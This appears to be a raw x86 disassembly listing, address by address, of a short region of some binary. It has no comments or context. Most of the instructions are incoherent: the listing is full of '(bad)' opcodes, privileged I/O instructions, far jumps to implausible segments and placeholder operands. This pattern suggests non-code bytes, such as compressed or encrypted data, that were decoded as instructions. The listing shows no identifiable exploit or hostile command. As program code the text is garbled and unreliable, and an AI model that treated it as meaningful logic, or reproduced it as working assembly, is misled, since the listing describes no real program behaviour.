  41f1f4:	sar    DWORD PTR [eax],0x26
  41f1f7:	daa    
  41f1f8:	mov    edi,0xd2526272
  41f1fd:	loop   0x41f1b1
  41f1ff:	jnp    0x41f1d2
  41f201:	or     bl,BYTE PTR [ebp+0x4b]
  41f204:	jl     0x41f221
  41f206:	xchg   edx,eax
  41f207:	xchg   edi,eax
  41f208:	inc    esp
  41f209:	ret    
  41f20a:	retf   0x14b2
  41f20d:	test   BYTE PTR [eax-0x6c],ah
  41f210:	outs   dx,DWORD PTR ds:[esi]
  41f211:	jbe    0x41f281
  41f213:	stc    
  41f214:	mov    al,ds:0xc18f0c7e
  41f219:	jb     0x41f247
  41f21b:	mov    esi,ebp
  41f21d:	lods   eax,DWORD PTR ds:[esi]
  41f21e:	mov    BYTE PTR [eax+0x3c84f331],ch
  41f224:	cmp    al,al
  41f226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f227:	mov    cl,BYTE PTR [ebp-0x7acead5f]
  41f22d:	aaa    
  41f22e:	and    BYTE PTR [ebx+0x27],bh
  41f231:	pushf  
  41f232:	lea    ebp,[edx]
  41f234:	dec    esi
  41f235:	mov    ecx,DWORD PTR [ebp+0x32e0b376]
  41f23b:	add    eax,0x934e48dc
  41f240:	into   
  41f241:	dec    esp
  41f242:	(bad)  
  41f243:	adc    esp,DWORD PTR [eax-0x3c2e9ca8]
  41f249:	inc    ebp
  41f24b:	inc    ebx
  41f24c:	sub    BYTE PTR [edi],dl
  41f24e:	lea    ebx,[esi-0x45]
  41f251:	pop    edx
  41f252:	xchg   edx,eax
  41f253:	pop    ds
  41f254:	sahf   
  41f255:	adc    ebp,edx
  41f257:	or     esp,DWORD PTR [ebx-0x2582e32d]
  41f25d:	mov    ebp,0x944ff4
	...
  41f26a:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  41f270:	lods   eax,DWORD PTR ds:[esi]
  41f271:	fcomi  st,st(7)
  41f273:	sar    BYTE PTR [ebx],cl
  41f275:	(bad)  
  41f276:	add    BYTE PTR [edi],ah
  41f278:	inc    edx
  41f279:	in     eax,dx
  41f27a:	aad    0xa3
  41f27c:	xchg   esp,eax
  41f27d:	add    DWORD PTR [eax],eax
  41f27f:	scas   al,BYTE PTR es:[edi]
  41f280:	add    BYTE PTR [eax],al
  41f282:	add    BYTE PTR [esi+0x1c40af20],dh
  41f288:	ins    DWORD PTR es:[edi],dx
  41f289:	adc    ecx,DWORD PTR [eax+0x16]
  41f28c:	ins    DWORD PTR es:[edi],dx
  41f28d:	mov    al,ds:0x3124f3e2
  41f292:	cmp    dh,BYTE PTR [eax-0x6ca9c814]
  41f298:	push   ss
  41f299:	xchg   edi,eax
  41f29a:	lds    edi,FWORD PTR [eax+0x72057f1f]
  41f2a0:	jp     0x41f27d
  41f2a2:	into   
  41f2a3:	sbb    ecx,DWORD PTR [eax-0x1]
  41f2a6:	jmp    0x5a3ea36
  41f2ab:	test   BYTE PTR ds:0x614cd326,dh
  41f2b1:	xchg   esi,eax
  41f2b2:	sbb    eax,0xe8a030df
  41f2b7:	xlat   BYTE PTR ds:[ebx]
  41f2b8:	jecxz  0x41f26a
  41f2ba:	pop    ecx
  41f2bb:	push   eax
  41f2bc:	(bad)  
  41f2bd:	lahf   
  41f2be:	or     bl,0xbe
  41f2c1:	sub    DWORD PTR [ebp-0x54bc2d6],eax
  41f2c7:	mov    edi,?
  41f2c9:	adc    DWORD PTR [ebx+0xf90780b],ebp
  41f2cf:	or     DWORD PTR [ecx-0x61],edi
  41f2d2:	lea    edi,[ebx+0x23]
  41f2d5:	mov    esi,0xee77ebab
  41f2da:	push   0xffffff8d
  41f2dc:	adc    al,0xf0
  41f2de:	cmp    al,0x33
  41f2e0:	sub    ch,BYTE PTR [edx]
  41f2e2:	jb     0x41f2ab
  41f2e4:	adc    ebp,ebx
  41f2e6:	dec    edi
  41f2e7:	aad    0x27
  41f2e9:	mov    cl,0xeb
  41f2eb:	mov    DWORD PTR [esi-0x38b55f6e],0x5bc6c0a8
  41f2f5:	xchg   esp,eax
  41f2f6:	sub    BYTE PTR [ebx],0xa9
  41f2f9:	or     cl,BYTE PTR [edi]
  41f2fb:	xlat   BYTE PTR ds:[ebx]
  41f2fc:	inc    eax
  41f2fd:	pop    edx
  41f2fe:	mov    ds:0x91d0116a,al
  41f303:	push   0x7b303496
  41f308:	add    esi,DWORD PTR [eax+0x33]
  41f30b:	fnstsw WORD PTR [edi]
  41f30d:	add    al,0x17
  41f30f:	sbb    DWORD PTR [ecx+0x7d374bfd],ebp
  41f315:	std    
  41f316:	cmp    ebx,esp
  41f318:	dec    eax
  41f319:	xchg   ebx,eax
  41f31a:	sbb    ecx,DWORD PTR [eax]
  41f31c:	xchg   ecx,eax
  41f31d:	int    0x1e
  41f31f:	in     al,0x57
  41f321:	xchg   esp,eax
  41f322:	add    al,BYTE PTR [edi+0x72]
  41f325:	jae    0x41f2cd
  41f327:	mov    al,ds:0x70522ce5
  41f32c:	dec    esi
  41f32d:	sbb    al,0xb5
  41f32f:	into   
  41f330:	jge    0x41f332
	...
  41f33a:	add    BYTE PTR [eax],cl
  41f33c:	div    DWORD PTR [edi+0x4a]
  41f33f:	dec    edx
  41f341:	cmp    eax,0x2e8eedf7
  41f346:	dec    eax
  41f347:	cmp    BYTE PTR [ecx+ecx*2+0x74],ah
  41f34b:	push   ecx
  41f34c:	xchg   ebp,eax
  41f34d:	add    DWORD PTR [eax],eax
  41f34f:	scas   al,BYTE PTR es:[edi]
  41f350:	add    BYTE PTR [eax],al
  41f352:	add    bl,ah
  41f354:	mov    edx,0x66a29c0
  41f359:	cmp    al,0xc5
  41f35b:	das    
  41f35c:	arpl   dx,sp
  41f35e:	jae    0x41f352
  41f360:	loopne 0x41f331
  41f362:	lock push ds
  41f364:	stos   DWORD PTR es:[edi],eax
  41f365:	xchg   ecx,eax
  41f366:	aaa    
  41f367:	mov    edi,0x406dd23f
  41f36c:	(bad)
  41f371:	je     0x41f2f5
  41f373:	add    al,0x8d
  41f375:	adc    cl,BYTE PTR [edx+eiz*4-0x6eba39ec]
  41f37c:	popf   
  41f37d:	inc    edi
  41f37e:	cmp    bh,bl
  41f380:	sub    bl,BYTE PTR [esi+esi*4]
  41f383:	daa    
  41f384:	pop    esp
  41f385:	mov    esi,0xf8650cb1
  41f38a:	xchg   ebp,eax
  41f38b:	addr16 mov cs,esi
  41f38e:	test   DWORD PTR [ebp-0x4c6c7cd0],0xa0896ec8
  41f398:	jmp    0x5c41:0x6e296a35
  41f39f:	xchg   ebp,eax
  41f3a0:	sahf   
  41f3a1:	inc    eax
  41f3a2:	enter  0xbf84,0xc6
  41f3a6:	aas    
  41f3a7:	rol    esi,1
  41f3a9:	iret   
  41f3aa:	push   esi
  41f3ab:	xchg   edx,eax
  41f3ac:	into   
  41f3ad:	xor    eax,esp
  41f3af:	fcom   QWORD PTR es:[edx-0x54]
  41f3b3:	scas   eax,DWORD PTR es:[edi]
  41f3b4:	scas   al,BYTE PTR es:[edi]
  41f3b5:	mov    bh,bl
  41f3b7:	cmp    BYTE PTR [edi+0x27],bh
  41f3ba:	xchg   ebp,eax
  41f3bb:	mov    ebx,0x61800fbf
  41f3c0:	inc    edi
  41f3c1:	cwde   
  41f3c2:	nop
  41f3c3:	xchg   ebx,eax
  41f3c4:	loop   0x41f3bd
  41f3c6:	push   esp
  41f3c7:	ss ja  0x41f3d8
  41f3ca:	lods   al,BYTE PTR ds:[esi]
  41f3cb:	aam    0x40
  41f3cd:	rcr    BYTE PTR [esi+0x4f52d722],cl
  41f3d3:	push   esi
  41f3d4:	scas   eax,DWORD PTR es:[edi]
  41f3d5:	jmp    0xe0c903af
  41f3da:	lods   al,BYTE PTR ds:[esi]
  41f3db:	mov    al,0xe8
  41f3dd:	daa    
  41f3de:	and    ah,bh
  41f3e0:	xlat   BYTE PTR ds:[ebx]
  41f3e1:	sbb    DWORD PTR [edx+0x41],esp
  41f3e4:	loope  0x41f3e7
  41f3e6:	(bad)  
  41f3e7:	outs   dx,BYTE PTR ds:[esi]
  41f3e8:	xlat   BYTE PTR ds:[ebx]
  41f3e9:	test   al,0x4b
  41f3eb:	sub    bl,BYTE PTR [esi+0x4]
  41f3ee:	xchg   DWORD PTR [ecx-0x631103b3],ebp
  41f3f4:	adc    DWORD PTR [edx+0x58],ebx
  41f3f7:	(bad)  
  41f3f8:	sbb    BYTE PTR [edi+0x7d],cl
  41f3fb:	push   0x1f12af6
  41f400:	jge    0x41f402
	...
  41f40a:	add    BYTE PTR [esi],dh
  41f40c:	arpl   WORD PTR [eax-0x10],bp
  41f40f:	jge    0x41f40c
  41f411:	mov    esi,0x8c7853e7
  41f416:	daa    
  41f417:	mov    ebx,0xff235907
  41f41c:	xchg   ebp,eax
  41f41d:	add    DWORD PTR [eax],eax
  41f41f:	scas   al,BYTE PTR es:[edi]
  41f420:	add    BYTE PTR [eax],al
  41f422:	add    dh,bh
  41f424:	in     al,dx
  41f425:	jmp    0x41f443
  41f427:	push   esp
  41f428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f429:	push   es
  41f42a:	bound  edx,QWORD PTR [edi-0x31997c1b]
  41f430:	ins    BYTE PTR es:[edi],dx
  41f431:	leave  
  41f432:	test   al,0x56
  41f434:	imul   esi,DWORD PTR [eax+ecx*1+0x48],0xcec8f21a
  41f43c:	adc    ebp,DWORD PTR [esi+ebx*1]
  41f43f:	pop    esp
  41f440:	mov    ecx,0x4b6605e
  41f445:	mov    esp,0x7f103610
  41f44a:	loopne 0x41f4b4
  41f44c:	stos   BYTE PTR es:[edi],al
  41f44d:	inc    edi
  41f44e:	gs jl  0x41f40a
  41f451:	lds    ebp,FWORD PTR [edi+ecx*4-0x4281525d]
  41f458:	xchg   esp,eax
  41f459:	ror    BYTE PTR [ebp+edx*1-0x43],0x70
  41f45e:	pop    eax
  41f45f:	outs   dx,DWORD PTR ds:[esi]
  41f460:	dec    ecx
  41f461:	mov    eax,ds:0x368fd728
  41f466:	(bad)  
  41f467:	bnd jnp 0x41f4bf
  41f46a:	push   ds
  41f46b:	sbb    WORD PTR ds:0x675bcd4e,cx
  41f472:	lods   al,BYTE PTR ds:[esi]
  41f473:	cmp    al,0x17
  41f475:	and    eax,0xb8fa7931
  41f47a:	ss jno 0x41f434
  41f47d:	xor    BYTE PTR [eax+0x4303bf0f],cl
  41f483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f484:	sub    bh,BYTE PTR [edx+0x7d]
  41f487:	sub    al,0xf0
  41f489:	inc    eax
  41f48a:	daa    
  41f48b:	xchg   ecx,eax
  41f48c:	shl    DWORD PTR [eax-0x210299b3],cl
  41f492:	adc    BYTE PTR [ebx+0x7a],ch
  41f495:	mov    esi,0xb73992a7
  41f49a:	push   cs
  41f49b:	pop    ecx
  41f49c:	or     eax,0x32ec837
  41f4a1:	retf   
  41f4a2:	test   BYTE PTR [ebx],bl
  41f4a4:	not    BYTE PTR [edi+0x3f]
  41f4a7:	cmp    eax,0x8080c269
  41f4ac:	add    eax,0x5328dc1f
  41f4b1:	mov    ecx,0xd2c8bce
  41f4b6:	shl    WORD PTR [edi-0xafb9572],cl
  41f4bd:	cld    
  41f4be:	push   esp
  41f4bf:	inc    ebp
  41f4c0:	ds ins DWORD PTR es:[edi],dx
  41f4c2:	test   BYTE PTR [ecx+0x58],cl
  41f4c5:	adc    edx,DWORD PTR [edx]
  41f4c7:	into   
  41f4c8:	cmovbe ecx,eax
  41f4cb:	xor    al,BYTE PTR [ebx]
  41f4cd:	jmp    0x41f47d
  41f4cf:	mov    ds:0x1f,eax
  41f4d4:	add    BYTE PTR [eax],al
  41f4d6:	add    BYTE PTR [eax],al
  41f4d8:	add    BYTE PTR [eax],al
  41f4da:	add    BYTE PTR [edi],ah
  41f4dc:	push   ecx
  41f4dd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41f4e7:	push   ss
  41f4e8:	pop    ax
  41f4ea:	out    dx,al
  41f4eb:	jmp    0xae41f692
  41f4f0:	add    BYTE PTR [eax],al
  41f4f2:	add    bl,dh
  41f4f4:	xchg   ebp,eax
  41f4f5:	inc    edx
  41f4f6:	pusha  
  41f4f7:	xchg   edx,eax
  41f4f8:	dec    ecx
  41f4f9:	in     eax,dx
  41f4fa:	repz sbb al,0x6b
  41f4fd:	mov    esi,DWORD PTR [esp+esi*4-0x40]
  41f501:	cmp    bl,cl
  41f503:	int3   
  41f504:	sub    al,0x48
  41f506:	std    
  41f507:	sbb    DWORD PTR [ebx],esp
  41f509:	outs   dx,BYTE PTR ds:[esi]
  41f50a:	aam    0xfe
  41f50c:	scas   eax,DWORD PTR es:[edi]
  41f50d:	dec    DWORD PTR fs:[edx]
  41f510:	data16 std 
  41f512:	(bad)  
  41f513:	mov    WORD PTR ds:0xf1bc9c7e,?
  41f519:	jns    0x41f51f
  41f51b:	mov    eax,0x4b0c695
  41f520:	hlt    
  41f521:	(bad)  
  41f522:	mov    al,0xdc
  41f524:	imul   esi,DWORD PTR [ecx+0x45],0x17
  41f528:	lock sbb DWORD PTR [esi+eax*8+0xc132d3e],ebp
  41f530:	inc    ebx
  41f531:	cmp    BYTE PTR [edi-0x3c5fb786],0xfb
  41f538:	les    eax,FWORD PTR [edi+edi*2]
  41f53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f53c:	test   al,0x78
  41f53e:	xchg   ecx,eax
  41f53f:	inc    eax
  41f540:	stc    
  41f541:	and    BYTE PTR [ecx+0x1bc8e4f3],0xbc
  41f548:	xor    ebx,ebx
  41f54a:	fsub   DWORD PTR [edi]
  41f54c:	pop    eax
  41f54d:	sub    al,0x53
  41f54f:	scas   al,BYTE PTR es:[edi]
  41f550:	sbb    eax,DWORD PTR [ebx]
  41f552:	jmp    0x41f5bd
  41f554:	xor    bl,0x71
  41f557:	iret   
  41f558:	cmp    BYTE PTR [edi],ah
  41f55a:	fwait
  41f55b:	in     eax,0x90
  41f55d:	out    0x69,eax
  41f55f:	sbb    eax,0x487f8356
  41f564:	daa    
  41f565:	ja     0x41f5a2
  41f567:	ins    DWORD PTR es:[edi],dx
  41f568:	push   esp
  41f569:	mov    esp,0x186be94b
  41f56e:	or     DWORD PTR [eax-0x1243ef14],ebp
  41f574:	sbb    esp,ecx
  41f576:	xchg   esp,eax
  41f577:	or     eax,0x5f92d283
  41f57c:	xlat   BYTE PTR ds:[ebx]
  41f57d:	jmp    0x41f5ea
  41f57f:	mov    edx,0x3443c26e
  41f584:	jge    0x41f543
  41f586:	retf   
  41f587:	inc    esi
  41f588:	aad    0xf
  41f58a:	pop    esi
  41f58b:	popa   
  41f58c:	mov    edi,0x2078cd8e
  41f591:	mov    ebx,0xea59ca28
  41f596:	adc    al,0xca
  41f598:	fld    st(4)
  41f59a:	cmp    BYTE PTR [ebx],bl
  41f59c:	mov    ds:0x487c0889,al
	...
  41f5a9:	add    BYTE PTR [eax],al
  41f5ab:	daa    
  41f5ac:	ss lahf 
  41f5ae:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f5b4:	and    eax,0xff91075b
  41f5b9:	pop    ebx
  41f5ba:	jb     0x41f553
  41f5bc:	mov    ds:0xae0001,eax
  41f5c1:	add    BYTE PTR [eax],al
  41f5c3:	push   ecx
  41f5c4:	ror    BYTE PTR [edi+0x51],1
  41f5c7:	inc    edx
  41f5c8:	(bad)  
  41f5c9:	fnstsw WORD PTR [esi]
  41f5cb:	mov    cl,0xf5
  41f5cd:	pop    ebx
  41f5ce:	daa    
  41f5cf:	popf   
  41f5d0:	fsub   DWORD PTR [edx]
  41f5d2:	cmp    BYTE PTR [ecx],cl
  41f5d4:	sbb    ebx,DWORD PTR [esi-0x590c464a]
  41f5da:	jge    0x41f590
  41f5dc:	push   ebx
  41f5dd:	mov    edx,0xbefbcab6
  41f5e2:	inc    esp
  41f5e3:	push   edx
  41f5e4:	cmp    al,0x19
  41f5e6:	push   es
  41f5e7:	fild   QWORD PTR [esi-0x6f]
  41f5ea:	or     BYTE PTR [esi+0x47406325],0x18
  41f5f1:	aam    0xf0
  41f5f3:	push   ecx
  41f5f4:	or     bl,ah
  41f5f6:	push   esp
  41f5f7:	jmp    0x41f63c
  41f5f9:	dec    ebx
  41f5fa:	xchg   BYTE PTR [ebp+0x53a559b5],ch
  41f600:	ins    BYTE PTR es:[edi],dx
  41f601:	adc    eax,0xa4369b3f
  41f606:	jbe    0x41f5ea
  41f608:	push   edi
  41f609:	(bad)  [edi-0x4742ee72]
  41f60f:	sti    
  41f610:	call   0x4dd6:0x25af9595
  41f617:	mov    eax,ds:0x7e401e6a
  41f61c:	cmp    BYTE PTR [edi-0xed599d3],ah
  41f622:	xor    ah,BYTE PTR [ebp-0x29b5a171]
  41f628:	cmp    BYTE PTR [ecx+eiz*8],dh
  41f62b:	mov    bl,0x2b
  41f62d:	call   0xd877:0x9ca3aab7
  41f634:	adc    al,0x79
  41f636:	jbe    0x41f690
  41f638:	dec    esp
  41f639:	sbb    edx,DWORD PTR [eax+0x47]
  41f63c:	mov    edi,DWORD PTR [ecx+0x1450c25c]
  41f642:	push   ebp
  41f643:	outs   dx,BYTE PTR ds:[esi]
  41f644:	xchg   edi,eax
  41f645:	mov    ds:0xe837e8f7,eax
  41f64a:	repz push ss
  41f64c:	and    al,0xb4
  41f64e:	fild   WORD PTR [ecx-0x11]
  41f651:	xchg   BYTE PTR [ecx-0x42373fa6],ch
  41f657:	cmp    dl,BYTE PTR [ebp-0x65]
  41f65a:	push   es
  41f65b:	pop    esp
  41f65c:	rcr    BYTE PTR [esi],0xd1
  41f65f:	jae    0x41f634
  41f661:	lea    ebp,ss:[edx]
  41f664:	sub    BYTE PTR [esi],cl
  41f666:	cmp    eax,0x68e18526
  41f66b:	das    
  41f66c:	adc    cl,dl
  41f66e:	push   esi
  41f66f:	add    BYTE PTR ds:0x0,dh
  41f675:	add    BYTE PTR [eax],al
  41f677:	add    BYTE PTR [eax],al
  41f679:	add    BYTE PTR [eax],al
  41f67b:	aaa    
  41f67c:	(bad)  
  41f67d:	out    0xc2,eax
  41f67f:	mul    ebx
  41f681:	aaa    
  41f682:	cmc    
  41f683:	xchg   ecx,eax
  41f684:	call   0x2b4e:0xc950eef4
  41f68b:	inc    ebp
  41f68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f68d:	add    DWORD PTR [eax],eax
  41f68f:	scas   al,BYTE PTR es:[edi]
  41f690:	add    BYTE PTR [eax],al
  41f692:	add    BYTE PTR [esp+ebx*2+0x5a],bh
  41f696:	fild   WORD PTR [edx]
  41f698:	xor    edi,DWORD PTR [edx+0x25d86bd7]
  41f69e:	jae    0x41f6e7
  41f6a0:	mov    dl,0x3d
  41f6a2:	das    
  41f6a3:	inc    ebp
  41f6a4:	gs ins BYTE PTR es:[edi],dx
  41f6a6:	mov    ebx,0x887c45c0
  41f6ab:	sub    dh,BYTE PTR [edx+0x44]
  41f6ae:	retf   
  41f6af:	mov    esp,0x37344a17
  41f6b4:	push   ebp
  41f6b5:	lock pop eax
  41f6b7:	add    eax,0x6970283a
  41f6bc:	push   edx
  41f6bd:	xor    al,0xac
  41f6bf:	ret    0x2df
  41f6c2:	fcomp  DWORD PTR [ecx]
  41f6c4:	jo     0x41f65b
  41f6c6:	mov    bl,al
  41f6c8:	mov    bh,0x4e
  41f6ca:	jge    0x41f662
  41f6cc:	push   edx
  41f6cd:	push   ecx
  41f6ce:	push   cs
  41f6cf:	ds cli 
  41f6d1:	pop    ds
  41f6d2:	outs   dx,DWORD PTR ds:[esi]
  41f6d3:	clc    
  41f6d4:	dec    esi
  41f6d5:	dec    ecx
  41f6d6:	xchg   edx,eax
  41f6d7:	aas    
  41f6d8:	adc    al,0x28
  41f6da:	cmp    al,0x78
  41f6dc:	sub    BYTE PTR [esp+edx*2-0x3d7863b2],bh
  41f6e3:	(bad)  
  41f6e4:	imul   DWORD PTR [eax+0xb]
  41f6e7:	adc    ebx,eax
  41f6e9:	pushf  
  41f6ea:	imul   DWORD PTR [edx+0x43]
  41f6ed:	inc    edi
  41f6ee:	add    ecx,esi
  41f6f0:	xor    eax,0x968de7b6
  41f6f5:	test   eax,0x2e721d4f
  41f6fa:	push   esp
  41f6fb:	shr    BYTE PTR [edx+0x42aa2d3b],cl
  41f701:	jno    0x41f718
  41f703:	add    eax,edx
  41f705:	gs xchg esp,eax
  41f707:	xchg   edx,eax
  41f708:	cli    
  41f709:	shl    BYTE PTR [edi+0x5a],1
  41f70c:	sbb    bh,0xdc
  41f70f:	sahf   
  41f710:	xor    DWORD PTR [esi+0x2e],ebp
  41f713:	or     DWORD PTR [ecx+ebx*2-0x2d],edx
  41f717:	es mov eax,0xbfe07d3d
  41f71d:	enter  0x3c59,0xdd
  41f721:	mov    dl,0x73
  41f723:	mov    BYTE PTR [edi+0x32],bh
  41f726:	push   cs
  41f727:	fisub  WORD PTR [ecx]
  41f729:	cmp    BYTE PTR [esi-0xa367ba5],dl
  41f72f:	jb     0x41f79a
  41f731:	pop    ebx
  41f732:	and    BYTE PTR [eax-0x2f],al
  41f735:	mov    ch,0x13
  41f737:	push   edx
  41f738:	outs   dx,DWORD PTR ds:[esi]
  41f739:	call   0xe6aa:0xa1a3eb6e
  41f740:	cmp    DWORD PTR [eax],eax
	...
  41f74a:	add    BYTE PTR [esi],dl
  41f74c:	aad    0xdf
  41f74e:	out    dx,eax
  41f74f:	fucomip st,st(7)
  41f751:	ss std 
  41f753:	cmp    BYTE PTR [esi-0x3fd9a0c6],al
  41f759:	pop    ebp
  41f75a:	stos   BYTE PTR es:[edi],al
  41f75b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f75d:	add    DWORD PTR [eax],eax
  41f75f:	scas   al,BYTE PTR es:[edi]
  41f760:	add    BYTE PTR [eax],al
  41f762:	add    BYTE PTR [ebx-0x1891e66f],al
  41f768:	into   
  41f769:	mov    DWORD PTR [edi+0x23],edx
  41f76c:	pop    ebp
  41f76d:	in     al,dx
  41f76e:	outs   dx,BYTE PTR ds:[esi]
  41f76f:	mov    dl,0xcc
  41f771:	mov    eax,DWORD PTR [edx]
  41f773:	int    0x4b
  41f775:	jp     0x41f7dc
  41f777:	jb     0x41f747
  41f779:	jns    0x41f756
  41f77b:	inc    ecx
  41f77c:	sti    
  41f77d:	push   ss
  41f77e:	loop   0x41f7c9
  41f780:	xor    al,0xfb
  41f782:	push   esi
  41f783:	out    0x15,al
  41f785:	fsub   DWORD PTR [ebp+0x11]
  41f788:	pop    ds
  41f789:	nop
  41f78a:	and    BYTE PTR [edi],al
  41f78c:	addr16 cmp esi,esp
  41f78f:	mov    al,0x72
  41f791:	ja     0x41f7b6
  41f793:	retf   0x3c6b
  41f796:	add    al,0xa1
  41f798:	push   0x292ec5d7
  41f79d:	in     eax,0x0
  41f79f:	repnz in eax,0x9b
  41f7a2:	sub    DWORD PTR [edi-0x759162fc],0x2e51152c
  41f7ac:	mov    bh,BYTE PTR [ebx]
  41f7ae:	ins    BYTE PTR es:[edi],dx
  41f7af:	gs aam 0xda
  41f7b2:	sbb    DWORD PTR [edi],0xca501c31
  41f7b8:	xchg   edx,eax
  41f7b9:	or     bh,BYTE PTR [esi+0x553aa718]
  41f7bf:	sub    al,0x3e
  41f7c1:	xor    DWORD PTR [ebx+0x4c],0x6a154cce
  41f7c8:	inc    eax
  41f7c9:	inc    edx
  41f7ca:	test   eax,0x50968688
  41f7cf:	scas   eax,DWORD PTR es:[edi]
  41f7d0:	mov    eax,es
  41f7d2:	ja     0x41f838
  41f7d4:	sti    
  41f7d5:	dec    eax
  41f7d6:	in     eax,dx
  41f7d7:	mov    eax,ds:0x7dae1a53
  41f7dc:	or     al,BYTE PTR [edx+ecx*8]
  41f7df:	retf   0xfbee
  41f7e2:	aas    
  41f7e3:	mov    ah,0xfe
  41f7e5:	daa    
  41f7e6:	fsubr  DWORD PTR [edx]
  41f7e8:	(bad)  
  41f7e9:	cld    
  41f7ea:	imul   ebx,esi,0xbb1d48c
  41f7f0:	xchg   BYTE PTR [edx+0x5c],dl
  41f7f3:	mov    edx,DWORD PTR fs:[ebx]
  41f7f6:	sar    dl,0xdb
  41f7f9:	mov    dh,0xfd
  41f7fb:	mov    bl,0x5b
  41f7fd:	daa    
  41f7fe:	xor    al,BYTE PTR [ebx-0x10d0a5f6]
  41f804:	mov    BYTE PTR [eax+esi*1],ch
  41f807:	scas   al,BYTE PTR es:[edi]
  41f808:	add    DWORD PTR [esi-0x18],edi
  41f80b:	dec    ecx
  41f80c:	xor    DWORD PTR [esi+0x16],edx
  41f80f:	scas   al,BYTE PTR es:[edi]
  41f810:	loop   0x41f812
	...
  41f81a:	add    BYTE PTR [esi+0x76],ch
  41f81d:	in     al,0xca
  41f81f:	cld    
  41f820:	fisubr DWORD PTR [esi-0xa]
  41f823:	sbb    BYTE PTR [edx+0x15779787],dl
  41f829:	retf   
  41f82a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f82b:	mov    eax,ds:0xae0001a5
  41f830:	add    BYTE PTR [eax],al
  41f832:	add    dh,bl
  41f834:	cmp    al,0x16
  41f836:	sbb    bl,BYTE PTR [ebx-0x676d5cfe]
  41f83c:	test   BYTE PTR [ebx+0x33],0x4a
  41f840:	ss aas 
  41f842:	mov    eax,ds:0x5048aabd
  41f847:	enter  0xa49c,0x5f
  41f84b:	dec    esp
  41f84c:	popf   
  41f84d:	xor    cl,BYTE PTR [esi]
  41f84f:	add    dl,BYTE PTR [ebp+0x67ac7217]
  41f855:	sbb    DWORD PTR [ebx-0x53],0xffffffa6
  41f859:	je     0x41f897
  41f85b:	in     al,dx
  41f85c:	outs   dx,BYTE PTR ds:[esi]
  41f85d:	popa   
  41f85e:	mov    ecx,DWORD PTR [eax+0x68bcae93]
  41f864:	stos   DWORD PTR es:[edi],eax
  41f865:	inc    edi
  41f866:	pop    es
  41f867:	push   edx
  41f868:	sbb    al,0xc8
  41f86a:	retf   
  41f86b:	stos   BYTE PTR es:[edi],al
  41f86c:	mov    ecx,eax
  41f86e:	std    
  41f86f:	sbb    al,0x64
  41f871:	lods   eax,DWORD PTR ds:[esi]
  41f872:	dec    ecx
  41f873:	xchg   ebp,eax
  41f874:	mov    al,ds:0x102b28c
  41f879:	and    esp,edi
  41f87b:	or     DWORD PTR [edi-0x16afe1ff],esi
  41f881:	fimul  DWORD PTR [ebp-0x3746105]
  41f887:	std    
  41f888:	and    DWORD PTR [ebx+0x5b],0x7dccb23f
  41f88f:	or     ch,0xf3
  41f892:	dec    esp
  41f893:	addr16 sbb eax,0xa7a8e938
  41f899:	ret    
  41f89a:	inc    ecx
  41f89b:	out    0x78,al
  41f89d:	in     eax,0x9e
  41f89f:	ret    0x70e5
  41f8a2:	aaa    
  41f8a3:	add    dl,BYTE PTR [ebx+0x136c12d1]
  41f8a9:	stos   DWORD PTR es:[edi],eax
  41f8aa:	ja     0x41f8dd
  41f8ac:	sbb    dl,cl
  41f8ae:	push   ebp
  41f8af:	fwait
  41f8b0:	mov    bh,0xc2
  41f8b2:	inc    edi
  41f8b3:	jb     0x41f890
  41f8b5:	mov    ebp,0x5b3a8a1c
  41f8ba:	mov    ecx,0x2ecacc93
  41f8bf:	enter  0x959a,0x61
  41f8c3:	(bad)  
  41f8c4:	cs movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f8c7:	loopne 0x41f8ad
  41f8c9:	aad    0xa0
  41f8cb:	pop    esp
  41f8cc:	aam    0x83
  41f8ce:	stc    
  41f8cf:	xor    DWORD PTR [edx+0x77],0xca25bf09
  41f8d6:	loopne 0x41f8cc
  41f8d8:	shl    DWORD PTR [ecx-0x4d],cl
  41f8db:	out    0xcc,eax
  41f8dd:	mov    DWORD PTR gs:[esi+0x8c],esi
  41f8e4:	add    BYTE PTR [eax],al
  41f8e6:	add    BYTE PTR [eax],al
  41f8e8:	add    BYTE PTR [eax],al
  41f8ea:	add    BYTE PTR [edx],bh
  41f8ec:	push   edx
  41f8ed:	les    ecx,FWORD PTR [edi]
  41f8ef:	in     al,dx
  41f8f0:	lahf   
  41f8f1:	sti    
  41f8f2:	ja     0x41f8ea
  41f8f4:	rcl    DWORD PTR [eax+0x30a6eed3],1
  41f8fa:	push   ebp
  41f8fb:	dec    edi
  41f8fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8fd:	add    DWORD PTR [eax],eax
  41f8ff:	scas   al,BYTE PTR es:[edi]
  41f900:	add    BYTE PTR [eax],al
  41f902:	add    bl,ah
  41f904:	pop    esp
  41f905:	sub    DWORD PTR [eax-0x36],ebx
  41f908:	(bad)  
  41f909:	dec    ecx
  41f90a:	xchg   ecx,eax
  41f90b:	in     al,dx
  41f90c:	ret    
  41f90d:	cmp    al,0xb8
  41f90f:	mov    dh,0xcd
  41f911:	pop    esi
  41f912:	addr16 out dx,eax
  41f914:	dec    eax
  41f915:	call   0x8063:0x5461f99d
  41f91c:	dec    edi
  41f91d:	shr    al,0xfe
  41f920:	(bad)  
  41f921:	mov    edx,0x5be12171
  41f926:	clc    
  41f927:	mov    eax,ds:0x3e08b7ce
  41f92c:	sub    eax,0xdee2a305
  41f931:	sbb    al,0x6a
  41f933:	aad    0x53
  41f935:	sahf   
  41f936:	out    dx,eax
  41f937:	test   eax,0x6f8ee31a
  41f93c:	cli    
  41f93d:	rol    BYTE PTR [eax],0xb7
  41f940:	sahf   
  41f941:	pop    ds
  41f942:	imul   edx,DWORD PTR [eax],0x7b
  41f945:	clc    
  41f946:	movq   mm1,mm5
  41f949:	es mov cl,0xb8
  41f94c:	push   0xee3e2c16
  41f951:	pusha  
  41f952:	and    edi,DWORD PTR [eax-0x2c]
